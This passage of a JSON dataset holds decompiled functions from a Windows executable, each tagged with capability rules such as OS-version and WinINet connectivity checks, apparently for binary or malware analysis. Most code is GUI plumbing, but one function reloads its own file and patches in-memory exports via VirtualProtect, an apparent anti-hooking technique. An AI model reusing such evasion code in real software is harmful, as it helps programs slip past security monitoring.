{\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = 1;\n                }\n                *(var_4h + 0x58) = uVar3;\n                if ((*(var_4h + 0x58) != '\\0') && (var_ch != 0)) {\n                    fcn.004635a4(&stack0xfffffffc);\n                    (**(**(var_4h + 0x84) + 0x74))();\n                    (**(**(var_4h + 0x84) + 0xe8))(&var_6dh, var_8h);\n                    sub.user32.dll_OffsetRect(&var_6dh, var_3ch, var_38h);\n                    cVar2 = fcn.00404154();\n                    if (cVar2 != '\\0') {\n                        iVar4 = fcn.00463604(&stack0xfffffffc);\n                        var_6dh = var_6dh - (iVar4 + 5);\n                        var_65h = var_65h - (iVar4 + 5);\n                    }\n                    fcn.0044502c();\n                    *(var_4h + 100) = var_88h;\n                    *(var_4h + 0x68) = var_84h;\n                    fcn.0044502c();\n                    *(var_4h + 0x6c) = var_88h;\n                    *(var_4h + 0x70) = var_84h;\n                    fcn.0044574c();\n                    (**(**(var_4h + 0x84) + 0xe4))(var_8h);\n                    fcn.004609e0();\n                    if (var_14h < 1) {\n                        fcn.004631dc();\n                    }\n                    else {\n                        fcn.004631dc();\n                    }\n                    goto code_r0x00463a0f;\n                }\n            }\n        }\n    }\n    if (var_14h < 1) {\n        fcn.00463414();\n    }\n    else {\n        fcn.004631dc();\n    }\ncode_r0x00463a0f:\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404dc4();\n    fcn.004058e0();\n    return;\n}\n",
        "token_count": 1421
    },
    "00463b14": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00463b14(void)\n\n{\n    if ((*(*0x496588 + 0x68) == 0) || (*(*(*0x496588 + 0x68) + 0x284) == 0)) {\n        fcn.00404df4();\n    }\n    else {\n        fcn.00404df4();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "00463b50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.00463b50(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0xf2) != 0) {\n        (**(in_EAX + 0xf0))();\n    }\n    iVar1 = sub.user32.dll_GetActiveWindow();\n    if (iVar1 == 0) {\n        sub.user32.dll_GetLastActivePopup(*(in_EAX + 0x30));\n    }\n    return CONCAT44(iVar1, iVar1);\n}\n",
        "token_count": 115
    },
    "00463bd8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00463bd8(int32_t param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uStack24;\n    \n    iVar4 = *(*0x496588 + 0x68);\n    if (iVar4 == 0) {\ncode_r0x00463c03:\n        if ((iVar4 != *(in_EAX + 0x44)) && (*(in_EAX + 0x44) != 0)) {\n            iVar4 = fcn.00446870(param_1);\n            if (iVar4 == 1) goto code_r0x00463c23;\n        }\n        uVar1 = 0;\n    }\n    else {\n        iVar3 = fcn.00446870(param_1);\n        if (iVar3 != 1) goto code_r0x00463c03;\ncode_r0x00463c23:\n        uVar1 = 1;\n    }\n    uStack24 = param_2 & 0xffffff00 | uVar1;\n    if (uVar1 == 0) {\n        cVar2 = fcn.004040e4();\n        if ((((cVar2 != '\\0') && (*(param_1 + 0x6a) != '\\0')) && (*(param_1 + 0x60) != '\\0')) &&\n           ((*(param_1 + 0x1c) & 0x10) == 0)) {\n            fcn.004559ec();\n        }\n    }\n    return CONCAT44(uStack24, uStack24) & 0xffffffff000000ff;\n}\n",
        "token_count": 380
    },
    "00463db8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00463db8(void)\n\n{\n    uchar *puVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack20;\n    int32_t iStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x463e0b;\n    iStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff0;\n    *0x49658c = *0x49658c + 1;\n    if (*0x49658c == 0) {\n        puVar1 = &stack0xfffffffc;\n        if (*0x496584 != 0) {\n            iStack20 = 0x463ddf;\n            fcn.00457f7c();\n            puVar1 = puStack8;\n        }\n        puStack8 = puVar1;\n        if (*0x496598 != 0) {\n            iStack20 = *0x496598;\n            sub.kernel32.dll_CloseHandle_1();\n        }\n        fcn.00414a18();\n    }\n    *in_FS_OFFSET = iStack20;\n    return;\n}\n",
        "token_count": 260
    },
    "004641b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004641b4(void)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    while( true ) {\n        iVar1 = fcn.00463e1c();\n        iVar2 = iVar2 + iVar1;\n        if ((iVar1 == 1) && (*in_EAX == -0x3d)) break;\n        in_EAX = in_EAX + iVar1;\n        if (iVar1 == 0) {\n            return iVar2;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 132
    },
    "004641e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a4h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_b8h\n// WARNING: Variable defined which should be unmapped: var_b4h\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: lpModuleName\n// WARNING: Variable defined which should be unmapped: lpBuffer\n\nvoid fcn.004641e0(void)\n\n{\n    char *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    char **in_FS_OFFSET;\n    uchar uVar9;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    char *var_9ch;\n    char *var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint lpflOldProtect;\n    char *var_4ch;\n    char *var_48h;\n    uint32_t var_44h;\n    uint32_t dwSize;\n    char *lpAddress;\n    int32_t var_38h;\n    int32_t *var_34h;\n    char *var_30h;\n    char *lpString1;\n    char *pcStack44;\n    int32_t var_24h;\n    char *lpNumberOfBytesRead;\n    char *var_1ch;\n    char *var_18h;\n    int32_t lpBuffer;\n    char *lpModuleName;\n    uint lpString2;\n    uint hModule;\n    \n    var_18h = &stack0xfffffffc;\n    iVar6 = 0x18;\n    do {\n        iVar6 = iVar6 + -1;\n    } while (iVar6 != 0);\n    var_1ch = 0x4648d3;\n    lpNumberOfBytesRead = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004641e0::lpNumberOfBytesRead;\n    var_24h = 0x464221;\n    pcStack44 = fcn.00402ce4();\n    var_24h = 0x105;\n    var_30h = 0x464236;\n    lpString1 = in_EAX;\n    lpModuleName = pcStack44;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_30h = NULL;\n    var_34h = NULL;\n    var_38h = 3;\n    lpAddress = NULL;\n    dwSize = 1;\n    var_44h = 0x80000000;\n    var_48h = lpModuleName;\n    var_4ch = 0x464258;\n    uVar1 = sub.kernel32.dll_CreateFileA_1();\n    var_4ch = NULL;\n    lpflOldProtect = 0;\n    sub.kernel32.dll_SetFilePointer_1(uVar1, 0);\n    uVar2 = sub.kernel32.dll_GetFileSize_1(uVar1, 0);\n    lpBuffer = fcn.00402ce4();\n    sub.kernel32.dll_ReadFile_1(uVar1, lpBuffer, uVar2, &fcn.004641e0::lpNumberOfBytesRead, 0);\n    sub.kernel32.dll_CloseHandle_1(uVar1);\n    var_24h = *(lpBuffer + 0x3c) + lpBuffer;\n    pcVar3 = sub.kernel32.dll_VirtualAlloc_1(0, *(var_24h + 0x50), 0x2000, 1);\n    var_18h = pcVar3;\n    lpAddress = sub.kernel32.dll_VirtualAlloc_1(pcVar3, *(var_24h + 0x54), 0x1000, 4);\n    var_1ch = lpAddress;\n    fcn.00402ee0();\n    var_38h = var_24h + 0x18 + *(var_24h + 0x14);\n    uVar7 = *(var_24h + 6);\n    var_98h = pcVar3;\n    if (-1 < uVar7 - 1) {\n        iVar6 = 0;\n        do {\n            dwSize = *(var_38h + 8 + iVar6 * 0x28);\n            var_44h = *(var_38h + 0x10 + iVar6 * 0x28);\n            if (dwSize < var_44h) {\n                dwSize = var_44h;\n            }\n            lpAddress = sub.kernel32.dll_VirtualAlloc_1(pcVar3 + *(var_38h + 0xc + iVar6 * 0x28), dwSize, 0x1000, 4);\n            fcn.00403720();\n            fcn.00402ee0();\n            var_98h = lpAddress;\n            sub.kernel32.dll_VirtualFree_1();\n            iVar6 = iVar6 + 1;\n            uVar7 = uVar7 - 1;\n        } while (uVar7 != 0);\n    }\n    iVar6 = *(var_24h + 0x78);\n    piVar8 = pcVar3 + *(pcVar3 + iVar6 + 0x20);\n    var_34h = pcVar3 + *(pcVar3 + iVar6 + 0x1c);\n    iVar6 = *(pcVar3 + iVar6 + 0x18);\n    if (-1 < iVar6 + -1) {\n        do {\n            var_98h = pcVar3 + *piVar8;\n            var_30h = pcVar3 + *var_34h;\n            lpString1 = var_98h;\n            iVar4 = sub.kernel32.dll_lstrcmpiA();\n            if (iVar4 == 0) {\n                var_48h = var_30h;\n                break;\n            }\n            piVar8 = piVar8 + 1;\n            var_34h = var_34h + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n    }\n    var_9ch = lpModuleName;\n    iVar4 = sub.kernel32.dll_GetModuleHandleA_2(lpModuleName, var_98h);\n    var_24h = *(iVar4 + 0x3c) + iVar4;\n    iVar6 = *(var_24h + 0x78) + iVar4;\n    piVar8 = *(iVar6 + 0x20) + iVar4;\n    var_34h = *(iVar6 + 0x1c) + iVar4;\n    iVar6 = *(iVar6 + 0x18);\n    if (-1 < iVar6 + -1) {\n        do {\n            var_9ch = *piVar8 + iVar4;\n            var_30h = *var_34h + iVar4;\n            lpString1 = var_9ch;\n            iVar5 = sub.kernel32.dll_lstrcmpiA();\n            if (iVar5 == 0) {\n                var_4ch = var_30h;\n                break;\n            }\n            piVar8 = piVar8 + 1;\n            var_34h = var_34h + 1;\n            iVar6 = iVar6 + -1;\n        } while (iVar6 != 0);\n    }\n    if ((((var_48h != NULL) && (var_4ch != NULL)) && (*var_4ch != '\\0')) &&\n       ((*var_48h != '\\0' && (uVar9 = *var_4ch == *var_48h,  !uVar9)))) {\n        uVar1 = fcn.004641b4(var_9ch);\n        fcn.00404f98();\n        fcn.004051b0();\n        if (!uVar9) {\n            fcn.00404f98();\n            fcn.004051b0();\n            if (!uVar9) {\n                fcn.00404f98();\n                fcn.004051b0();\n                if (!uVar9) {\n                    fcn.00404f98();\n                    fcn.004051b0();\n                    if (!uVar9) {\n                        fcn.00404f98();\n                        fcn.004051b0();\n                        if (!uVar9) {\n                            fcn.00404f98();\n                            fcn.004051b0();\n                            if (!uVar9) {\n                                fcn.00404f98();\n                                fcn.004051b0();\n                                if (!uVar9) {\n                                    fcn.00404f98();\n                                    fcn.004051b0();\n                                    if (!uVar9) {\n                                        fcn.00404f98();\n                                        fcn.004051b0();\n                                        if (!uVar9) {\n                                            fcn.00404f98();\n                                            fcn.004051b0();\n                                            if (!uVar9) {\n                                                fcn.00404f98();\n                                                fcn.004051b0();\n                                                if (!uVar9) {\n                                                    fcn.00404f98();\n                                                    fcn.004051b0();\n                                                    if (!uVar9) {\n                                                        fcn.00404f98();\n                                                        fcn.004051b0();\n                                                        if (!uVar9) {\n                                                            fcn.00404f98();\n                                                            fcn.004051b0();\n                                                            if (!uVar9) {\n                                                                fcn.00404f98();\n                                                                fcn.004051b0();\n                                                                if (!uVar9) {\n                                                                    fcn.00404f98();\n                                                                    fcn.004051b0();\n                                                                    if (!uVar9) {\n                                                                        fcn.00404f98();\n                                                                        fcn.004051b0();\n                                                                        if (!uVar9) {\n                                                                            fcn.00404f98();\n                                                                            fcn.004051b0();\n                                                                            if (!uVar9) {\n                                                                                fcn.00404f98();\n                                                                                fcn.004051b0();\n                                                                                if (!uVar9) {\n                                                                                    fcn.00404f98();\n                                                                                    fcn.004051b0();\n                                                                                    if (!uVar9) {\n                                                                                        fcn.00404f98();\n                                                                                        fcn.004051b0();\n                                                                                        if (!uVar9) {\n                                                                                            fcn.00404f98();\n                                                                                            fcn.004051b0();\n                                                                                            if (!uVar9) {\n                                                                                                fcn.00404f98();\n                                                                                                fcn.004051b0();\n                                                                                                if (!uVar9) {\n                                                                                                    fcn.00404f98();\n                                                                                                    fcn.004051b0();\n                                                                                                    if (!uVar9) {\n                                                                                                        fcn.00404f98();\n                                                                                                        fcn.004051b0();\n                                                                                                        if (!uVar9) {\n                                                                                                            fcn.00404f98\n                                                            ();\n                                                            fcn.004051b0();\n                                                            if (!uVar9) {\n                                                                fcn.00404f98();\n                                                                fcn.004051b0();\n                                                                if (!uVar9) goto code_r0x00464885;\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        sub.kernel32.dll_VirtualProtect(var_4ch, uVar1, 0x40, &fcn.004641e0::lpflOldProtect);\n        fcn.0040774c();\n        sub.kernel32.dll_VirtualProtect(var_4ch, uVar1, lpflOldProtect, &fcn.004641e0::lpflOldProtect);\n    }\ncode_r0x00464885:\n    fcn.00402d00();\n    fcn.00402d00();\n    sub.kernel32.dll_VirtualFree_1(var_18h, 0, 0x8000);\n    pcVar3 = var_1ch;\n    sub.kernel32.dll_VirtualFree_1(var_1ch, 0, 0x8000);\n    *in_FS_OFFSET = pcVar3;\n    fcn.00404dc4(0x4648da);\n    return;\n}\n",
        "token_count": 3168
    },
    "00464b6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00464b6c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    iVar3 = *(param_2 + 0x18);\n    if (-1 < iVar3 + -1) {\n        do {\n            cVar1 = fcn.004641e0();\n            if (cVar1 == '\\x01') {\n                uVar2 = 1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return uVar2;\n}\n",
        "token_count": 146
    },
    "00464bac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00464bac(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x464c08);\n    iVar3 = *(*(iVar2 + 0x3c) + iVar2 + 0x78) + iVar2;\n    if ((iVar2 != iVar3) && (*(iVar3 + 0x18) != 0)) {\n        cVar1 = fcn.00464b6c();\n        if (cVar1 == '\\0') {\n            sub.kernel32.dll_Sleep_1(100);\n        }\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00465688": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00465688(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar3 = 0x4656aa;\n            iVar1 = fcn.00414eec();\n            if ((param_2 == *(iVar1 + 0x34)) && (*(iVar1 + 0x30) == param_1)) goto code_r0x004656dd;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    iVar1 = fcn.004654e8(param_1);\n    fcn.00414d8c();\n    iVar3 = param_1;\ncode_r0x004656dd:\n    return CONCAT44(iVar3, iVar1);\n}\n",
        "token_count": 225
    },
    "00465718": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00465718(uint param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    iVar2 = fcn.00426010();\n    *(in_EAX + 4) = iVar2;\n    *(iVar2 + 0x14) = in_EAX;\n    *(iVar2 + 0x10) = fcn.00465848;\n    *(in_EAX + 0x1c) = 0x8080;\n    *(in_EAX + 0x20) = 1;\n    uVar1 = 0;\n    do {\n        *(in_EAX + 0xc + uVar1 * 4) = 0xffffffff;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 != 4);\n    if (*0x491dd4 == 0) {\n        *0x491dd4 = fcn.00465614();\n    }\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 349
    },
    "00465918": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00465918(uint param_1, uint8_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack112;\n    uint uStack108;\n    uint *puVar9;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_28h;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t var_5h;\n    \n    var_5h._0_1_ = param_2;\n    if ((param_2 == 2) && (*(in_EAX + 0x20) < 3)) {\n        var_5h._0_1_ = 0;\n    }\n    iVar4 = *(in_EAX + 0xc + var_5h * 4);\n    if (iVar4 != -1) {\n        return iVar4;\n    }\n    puStack76 = 0x465959;\n    unique0x1000059a = in_EAX;\n    uVar2 = (**(**(in_EAX + 4) + 0x2c))();\n    puStack76 = 0x465966;\n    uVar3 = (**(**(stack0xfffffff8 + 4) + 0x20))();\n    if ((uVar2 | uVar3) == 0) {\n        return -1;\n    }\n    puStack76 = 0x465979;\n    iVar4 = (**(**(stack0xfffffff8 + 4) + 0x2c))();\n    iVar4 = iVar4 / *(stack0xfffffff8 + 0x20);\n    puStack76 = 0x465992;\n    uVar5 = (**(**(stack0xfffffff8 + 4) + 0x20))();\n    if (*(stack0xfffffff8 + 8) == 0) {\n        if (*0x491dd4 == 0) {\n            puStack76 = 0x4659b2;\n            *0x491dd4 = fcn.00465614();\n        }\n        puStack76 = 0x4659c5;\n        uVar6 = fcn.00465688();\n        *(stack0xfffffff8 + 8) = uVar6;\n    }\n    puStack76 = 0x4659d7;\n    var_ch = fcn.00426010();\n    uStack80 = 0x465ec3;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    (**(*var_ch + 0x40))();\n    (**(*var_ch + 0x34))();\n    fcn.00413a94(&fcn.00465918::var_28h, uVar5);\n    fcn.004265e4();\n    fcn.004214d4();\n    (**(**(stack0xfffffff8 + 4) + 0x24))();\n    fcn.00425da0();\n    (**(*var_ch + 0x38))();\n    puVar9 = 0x465a61;\n    fcn.00413a94(&fcn.00465918::var_38h, uVar5);\n    if (var_5h != 0) {\n        if (var_5h == 1) {\n            var_14h = NULL;\n            var_10h = NULL;\n            uStack108 = 0x465e88;\n            iStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            var_14h = fcn.00426010();\n            var_10h = fcn.00426010();\n            (**(*var_10h + 8))();\n            (**(*var_10h + 0x70))();\n            if (*(stack0xfffffff8 + 0x20) < 2) {\n                (**(*var_14h + 8))();\n                (**(*var_14h + 0x70))();\n                fcn.004265e4();\n                fcn.004214d4();\n                (**(*var_14h + 0x40))();\n                cVar1 = fcn.004266a0();\n                if (cVar1 != '\\0') {\n                    fcn.004265e4();\n                    fcn.00420c18();\n                    fcn.00427474();\n                    fcn.004265e4();\n                    fcn.004214d4();\n                }\n                fcn.00427474();\n                fcn.004265e4();\n                fcn.004214d4();\n                fcn.00421878();\n                fcn.004214d4();\n                uVar6 = fcn.00421c8c(0);\n                sub.gdi32.dll_SetTextColor(uVar6);\n                uVar6 = fcn.00421c8c(0xffffff);\n                sub.gdi32.dll_SetBkColor(uVar6);\n                fcn.004265e4(0, 0, 0xe20746);\n                uVar6 = fcn.00421c8c();\n                uVar6 = fcn.00421c8c(1, 1, iVar4, uVar5, uVar6);\n                sub.gdi32.dll_BitBlt(uVar6);\n                fcn.004214d4();\n                uVar6 = fcn.00421c8c(0);\n                sub.gdi32.dll_SetTextColor(uVar6);\n                uVar6 = fcn.00421c8c(0xffffff);\n                sub.gdi32.dll_SetBkColor(uVar6);\n                fcn.004265e4(0, 0, 0xe20746);\n                uVar6 = fcn.00421c8c();\n                iVar8 = fcn.00421c8c(0, 0, iVar4, uVar5, uVar6);\n                sub.gdi32.dll_BitBlt();\n            }\n            else {\n                var_18h = fcn.004265e4();\n                puVar9 = &fcn.00465918::var_38h;\n                fcn.004265e4();\n                fcn.00421744(puVar9);\n                fcn.00427474();\n                (**(*var_14h + 0x40))();\n                (**(*var_14h + 0x34))();\n                fcn.004265e4();\n                fcn.004214d4();\n                puVar9 = &fcn.00465918::var_38h;\n                uVar6 = fcn.004265e4();\n                fcn.004265e4(uVar6);\n                fcn.00421744(puVar9);\n                fcn.004214d4();\n                uVar6 = fcn.00421c8c();\n                sub.gdi32.dll_SetTextColor(uVar6, 0);\n                sub.gdi32.dll_SetBkColor(uVar6, 0xffffff);\n                fcn.004265e4(0, 0, 0xe20746);\n                uVar7 = fcn.00421c8c();\n                sub.gdi32.dll_BitBlt(uVar6, 0, 0, iVar4, uVar5, uVar7);\n                fcn.004265e4();\n                fcn.004214d4();\n                puVar9 = &fcn.00465918::var_38h;\n                uVar6 = fcn.004265e4();\n                fcn.004265e4(uVar6);\n                fcn.00421744(puVar9);\n                fcn.004214d4();\n                uVar6 = fcn.00421c8c();\n                sub.gdi32.dll_SetTextColor(uVar6, 0);\n                sub.gdi32.dll_SetBkColor(uVar6, 0xffffff);\n                fcn.004265e4(0, 0, 0xe20746);\n                uVar7 = fcn.00421c8c();\n                sub.gdi32.dll_BitBlt(uVar6, 0, 0, iVar4, uVar5, uVar7);\n                uVar6 = fcn.0042074c();\n                fcn.004265e4(uVar6);\n                fcn.004214d4();\n                puVar9 = &fcn.00465918::var_38h;\n                uVar6 = fcn.004265e4();\n                fcn.004265e4(uVar6);\n                fcn.00421744(puVar9);\n                fcn.004214d4();\n                iVar8 = fcn.00421c8c();\n                sub.gdi32.dll_SetTextColor(iVar8, 0);\n                sub.gdi32.dll_SetBkColor(iVar8, 0xffffff);\n                fcn.004265e4(0, 0, 0xe20746);\n                uVar6 = fcn.00421c8c();\n                sub.gdi32.dll_BitBlt(iVar8, 0, 0, iVar4, uVar5, uVar6);\n            }\n            *in_FS_OFFSET = iVar8;\n            fcn.00403f58(0x465e8f);\n            iVar4 = fcn.00403f58();\n            return iVar4;\n        }\n        if (1 < var_5h - 2) goto code_r0x00465ead;\n    }\n    puVar9 = &fcn.00465918::var_38h;\n    uStack108 = 0x465a83;\n    uStack108 = fcn.004265e4();\n    iStack112 = 0x465a8c;\n    fcn.004265e4();\n    uStack108 = 0x465a95;\n    fcn.00421744(puVar9);\n    if (*(*(stack0xfffffff8 + 4) + 0x38) == '\\x01') {\n        uStack108 = 0x465ab5;\n        uVar5 = fcn.004655b8();\n        *(stack0xfffffff8 + 0xc + var_5h * 4) = uVar5;\n    }\n    else {\n        uStack108 = 0x465ad8;\n        uVar5 = fcn.004655b8();\n        *(stack0xfffffff8 + 0xc + var_5h * 4) = uVar5;\n    }\ncode_r0x00465ead:\n    *in_FS_OFFSET = puVar9;\n    iVar4 = fcn.00403f58();\n    return iVar4;\n}\n",
        "token_count": 2419
    },
    "00465eec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465eec(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *arg_10h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 4) != 0) && (iVar2 = (**(**(in_EAX + 4) + 0x2c))(),  iVar2 != 0)) &&\n       (iVar2 = (**(**(in_EAX + 4) + 0x20))(),  iVar2 != 0)) {\n        uVar3 = fcn.00465918();\n        fcn.00437d14();\n        cVar1 = fcn.00437e1c();\n        if (cVar1 == '\\0') {\n            if ((arg_8h == '\\0') && (arg_ch != '\\x03')) {\n                uVar4 = fcn.0042074c(0x1fffffff, 0);\n                uVar4 = fcn.00421c8c(*var_8h, var_8h[1], 0, 0, uVar4);\n                uVar3 = fcn.00453564(uVar3, uVar4);\n                sub.comctl32.dll_ImageList_DrawEx(uVar3);\n            }\n            else {\n                uVar4 = fcn.00421c8c(*var_8h, var_8h[1], 0, 0, 0x1fffffff, 0x1fffffff, 1);\n                uVar3 = fcn.00453564(uVar3, uVar4);\n                sub.comctl32.dll_ImageList_DrawEx(uVar3);\n            }\n        }\n        else {\n            var_24h = 